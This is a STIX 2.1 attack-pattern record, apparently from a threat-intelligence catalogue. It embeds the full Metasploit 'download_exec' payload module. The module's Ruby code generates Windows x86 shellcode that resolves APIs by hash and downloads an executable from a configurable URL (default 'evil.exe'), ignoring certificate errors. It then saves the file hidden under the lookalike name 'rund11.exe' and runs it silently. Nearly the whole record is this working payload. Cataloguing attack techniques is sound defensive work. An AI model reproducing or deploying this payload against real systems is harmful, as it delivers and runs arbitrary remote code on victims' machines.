{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0f7c8ac0-975c-4672-8093-62aecb456177",
    "created": "2024-08-14T16:33:19.366772Z",
    "modified": "2024-08-14T16:33:19.366776Z",
    "name": "Windows Executable Download (http,https,ftp) and Execute",
    "description": "Download an EXE from an HTTP(S)/FTP URL and execute it",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/download_exec.rb",
            "external_id": "download_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 423\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Windows Executable Download (http,https,ftp) and Execute',\n      'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',\n      'Author'        =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>'\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86\n    ))\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('URL', [true, \"The pre-encoded URL to the executable\" ,\"https://localhost:443/evil.exe\"]),\n        OptString.new('EXE', [ true, \"Filename to save & run executable on target system\", \"rund11.exe\" ])\n      ])\n  end\n\n  #\n  # Construct the payload\n  #\n  def generate(_opts = {})\n\n    target_uri = datastore['URL'] || \"\"\n    filename = datastore['EXE'] || \"\"\n    proto = \"https\"\n    dwflags_asm = \"push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\\n\"\n      #;0x80000000 |        ; INTERNET_FLAG_RELOAD\n      #;0x04000000 |        ; INTERNET_NO_CACHE_WRITE\n      #;0x00800000 |        ; INTERNET_FLAG_SECURE\n      #;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT\n      #;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID\n      #;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID\n      #;0x00000200          ; INTERNET_FLAG_NO_UI\"\n\n    exitfuncs = {\n        \"PROCESS\"   => 0x56A2B5F0,\t#kernel32.dll!ExitProcess\n        \"THREAD\"    => 0x0A2A1DE0,\t#kernel32.dll!ExitThread\n        \"SEH\"       => 0x00000000,\t#we don't care\n        \"NONE\"      => 0x00000000\t#we don't care\n        }\n\n    protoflags = {\n        \"http\"\t=> 0x3,\n        \"https\"\t=> 0x3,\n        \"ftp\"\t=> 0x1\n        }\n\n    exitfunc = datastore['EXITFUNC'].upcase\n\n    if exitfuncs[exitfunc]\n      exitasm = case exitfunc\n        when \"SEH\" then \"xor eax,eax\\ncall eax\"\n        when \"NONE\" then \"jmp end\"\t# don't want to load user32.dll for GetLastError\n        else \"push 0x0\\npush 0x%x\\ncall ebp\" % exitfuncs[exitfunc]\n      end\n    end\n\n    # parse URL and break it down in\n    # - remote host\n    # - port\n    # - /path/to/file\n\n    server_uri  = ''\n    server_host = ''\n    port_nr     = 443\t# default\n\n    if target_uri.length > 0\n\n      # get desired protocol\n      if target_uri =~ /^http:/\n        proto = \"http\"\n        port_nr = 80\n        dwflags_asm = \"push (0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\\n\"\n          #;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION\n      end\n\n      if target_uri =~ /^ftp:/\n        proto = \"ftp\"\n        port_nr = 21\n        dwflags_asm = \"push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\\n\"\n      end\n\n      # sanitize the input\n      target_uri = target_uri.gsub('http://','')\t#don't care about protocol\n      target_uri = target_uri.gsub('https://','')\t#don't care about protocol\n      target_uri = target_uri.gsub('ftp://','')\t#don't care about protocol\n\n      server_info = target_uri.split(\"/\")\n\n      # did user specify a port ?\n      server_parts = server_info[0].split(\":\")\n      if server_parts.length > 1\n        port_nr = Integer(server_parts[1])\n      end\n\n      # actual target host\n      server_host = server_parts[0]\n\n      # get /path/to/remote/exe\n\n      for i in (1..server_info.length-1)\n        server_uri << \"/\"\n        server_uri << server_info[i]\n      end\n\n    end\n\n    # get protocol specific stuff\n\n    #create actual payload\n    payload_data = <<EOS\n  cld\n  call start\n; Stephen Fewer's block_api\n; block_api code (Stephen Fewer)\napi_call:\n  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.\n  mov ebp, esp           ; Create a new stack frame\n  xor edx, edx           ; Zero EDX\n  mov edx, fs:[edx+48]   ; Get a pointer to the PEB\n  mov edx, [edx+12]      ; Get PEB->Ldr\n  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list\nnext_mod:\n  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)\n  movzx ecx, word [edx+38] ; Set ECX to the length we want to check\n  xor edi, edi           ; Clear EDI which will store the hash of the module name\nloop_modname:              ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the name\n  cmp al, 'a'            ; Some versions of Windows use lower case module names\n  jl not_lowercase       ;\n  sub al, 0x20           ; If so normalise to uppercase\nnot_lowercase:             ;\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  loop loop_modname      ; Loop untill we have read enough\n  ; We now have the module hash computed\n  push edx               ; Save the current position in the module list for later\n  push edi               ; Save the current module hash for later\n  ; Proceed to iterate the export address table,\n  mov edx, [edx+16]      ; Get this modules base address\n  mov eax, [edx+60]      ; Get PE header\n  add eax, edx           ; Add the modules base address\n  mov eax, [eax+120]     ; Get export tables RVA\n  test eax, eax          ; Test if no export address table is present\n  jz get_next_mod1       ; If no EAT present, process the next module\n  add eax, edx           ; Add the modules base address\n  push eax               ; Save the current modules EAT\n  mov ecx, [eax+24]      ; Get the number of function names\n  mov ebx, [eax+32]      ; Get the rva of the function names\n  add ebx, edx           ; Add the modules base address\n  ; Computing the module hash + function hash\nget_next_func:             ;\n  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module\n  dec ecx                ; Decrement the function name counter\n  mov esi, [ebx+ecx*4]   ; Get rva of next module name\n  add esi, edx           ; Add the modules base address\n  xor edi, edi           ; Clear EDI which will store the hash of the function name\n  ; And compare it to the one we want\nloop_funcname:             ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the ASCII function name\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)\n  jne loop_funcname      ; If we have not reached the null terminator, continue\n  add edi, [ebp-8]       ; Add the current module hash to the function hash\n  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for\n  jnz get_next_func      ; Go compute the next function hash if we have not found it\n  ; If found, fix up stack, call the function and then value else compute the next one...\n  pop eax                ; Restore the current modules EAT\n  mov ebx, [eax+36]      ; Get the ordinal table rva\n  add ebx, edx           ; Add the modules base address\n  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal\n  mov ebx, [eax+28]      ; Get the function addresses table rva\n  add ebx, edx           ; Add the modules base address\n  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA\n  add eax, edx           ; Add the modules base address to get the functions actual VA\n  ; We now fix up the stack and perform the call to the desired function...\nfinish:\n  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad\n  pop ebx                ; Clear off the current modules hash\n  pop ebx                ; Clear off the current position in the module list\n  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered\n  pop ecx                ; Pop off the origional return address our caller will have pushed\n  pop edx                ; Pop off the hash value our caller will have pushed\n  push ecx               ; Push back the correct return value\n  jmp eax                ; Jump into the required function\n  ; We now automagically return to the correct caller...\nget_next_mod:              ;\n  pop eax                ; Pop off the current (now the previous) modules EAT\nget_next_mod1:             ;\n  pop edi                ; Pop off the current (now the previous) modules hash\n  pop edx                ; Restore our position in the module list\n  mov edx, [edx]         ; Get the next module\n  jmp.i8 next_mod        ; Process this module\n\n; actual routine\nstart:\n  pop ebp                ; get ptr to block_api routine\n; based on HDM's block_reverse_https.asm\nload_wininet:\n  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.\n  push 0x696e6977        ; ...\n  mov esi, esp           ; Save a pointer to wininet\n  push esp               ; Push a pointer to the \"wininet\" string on the stack.\n  push 0x0726774C        ; hash( \"kernel32.dll\", \"LoadLibraryA\" )\n  call ebp               ; LoadLibraryA( \"wininet\" )\n\ninternetopen:\n  xor edi,edi\n  push edi               ; DWORD dwFlags\n  push edi               ; LPCTSTR lpszProxyBypass\n  push edi               ; LPCTSTR lpszProxyName\n  push edi               ; DWORD dwAccessType (PRECONFIG = 0)\n  push esi               ; LPCTSTR lpszAgent (\"wininet\\x00\")\n  push 0xA779563A        ; hash( \"wininet.dll\", \"InternetOpenA\" )\n  call ebp\n\n  jmp.i8 dbl_get_server_host\n\ninternetconnect:\n  pop ebx                ; Save the hostname pointer\n  xor ecx, ecx\n  push ecx               ; DWORD_PTR dwContext (NULL)\n  push ecx               ; dwFlags\n  push #{protoflags[proto]}\t; DWORD dwService (INTERNET_SERVICE_HTTP or INTERNET_SERVICE_FTP)\n  push ecx               ; password\n  push ecx               ; username\n  push #{port_nr}        ; PORT\n  push ebx               ; HOSTNAME\n  push eax               ; HINTERNET hInternet\n  push 0xC69F8957        ; hash( \"wininet.dll\", \"InternetConnectA\" )\n  call ebp\n\n  jmp.i8 get_server_uri\n\nhttpopenrequest:\n  pop ecx\n  xor edx, edx            ; NULL\n  push edx                ; dwContext (NULL)\n  #{dwflags_asm}          ; dwFlags\n  push edx                ; accept types\n  push edx                ; referrer\n  push edx                ; version\n  push ecx                ; url\n  push edx                ; method\n  push eax                ; hConnection\n  push 0x3B2E55EB         ; hash( \"wininet.dll\", \"HttpOpenRequestA\" )\n  call ebp\n  mov esi, eax            ; hHttpRequest\n\nset_retry:\n  push 0x10\n  pop ebx\n\n; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );\nset_security_options:\n  push 0x00003380\n  mov eax, esp\n  push 4                 ; sizeof(dwFlags)\n  push eax               ; &dwFlags\n  push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)\n  push esi               ; hRequest\n  push 0x869E4675        ; hash( \"wininet.dll\", \"InternetSetOptionA\" )\n  call ebp\n\nhttpsendrequest:\n  xor edi, edi\n  push edi               ; optional length\n  push edi               ; optional\n  push edi               ; dwHeadersLength\n  push edi               ; headers\n  push esi               ; hHttpRequest\n  push 0x7B18062D        ; hash( \"wininet.dll\", \"HttpSendRequestA\" )\n  call ebp\n  test eax,eax\n  jnz create_file\n\ntry_it_again:\n  dec ebx\n  jz thats_all_folks\t; failure -> exit\n  jmp.i8 set_security_options\n\ndbl_get_server_host:\n  jmp get_server_host\n\nget_server_uri:\n  call httpopenrequest\n\nserver_uri:\n  db \"#{server_uri}\", 0x00\n\ncreate_file:\n  jmp.i8 get_filename\n\nget_filename_return:\n  xor eax,eax       ; zero eax\n  pop edi           ; ptr to filename\n  push eax          ; hTemplateFile\n  push 2            ; dwFlagsAndAttributes (Hidden)\n  push 2            ; dwCreationDisposition (CREATE_ALWAYS)\n  push eax          ; lpSecurityAttributes\n  push 2            ; dwShareMode\n  push 2            ; dwDesiredAccess\n  push edi          ; lpFileName\n  push 0x4FDAF6DA   ; kernel32.dll!CreateFileA\n  call ebp\n\ndownload_prep:\n  xchg eax, ebx     ; place the file handle in ebx\n  xor eax,eax       ; zero eax\n  mov ax,0x304      ; we'll download 0x300 bytes at a time\n  sub esp,eax       ; reserve space on stack\n\ndownload_more:\n  push esp          ; &bytesRead\n  lea ecx,[esp+0x8] ; target buffer\n  xor eax,eax\n  mov ah,0x03       ; eax => 300\n  push eax          ; read length\n  push ecx          ; target buffer on stack\n  push esi          ; hRequest\n  push 0xE2899612   ; hash( \"wininet.dll\", \"InternetReadFile\" )\n  call ebp\n\n  test eax,eax        ; download failed? (optional?)\n  jz thats_all_folks  ; failure -> exit\n\n  pop eax             ; how many bytes did we retrieve ?\n\n  test eax,eax        ; optional?\n  je close_and_run    ; continue until it returns 0\n\nwrite_to_file:\n  push 0              ; lpOverLapped\n  push esp            ; lpNumberOfBytesWritten\n  push eax            ; nNumberOfBytesToWrite\n  lea eax,[esp+0xc]   ; get pointer to buffer\n  push eax            ; lpBuffer\n  push ebx            ; hFile\n  push 0x5BAE572D     ; kernel32.dll!WriteFile\n  call ebp\n  sub esp,4           ; set stack back to where it was\n  jmp.i8 download_more\n\nclose_and_run:\n  push ebx\n  push 0x528796C6    ; kernel32.dll!CloseHandle\n  call ebp\n\nexecute_file:\n  push 0             ; don't show\n  push edi           ; lpCmdLine\n  push 0x876F8B31    ; kernel32.dll!WinExec\n  call ebp\n\nthats_all_folks:\n  #{exitasm}\n\nget_filename:\n  call get_filename_return\n  db \"#{filename}\",0x00\n\nget_server_host:\n  call internetconnect\n\nserver_host:\n  db \"#{server_host}\", 0x00\nend:\nEOS\n    self.assembly = payload_data\n    super\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}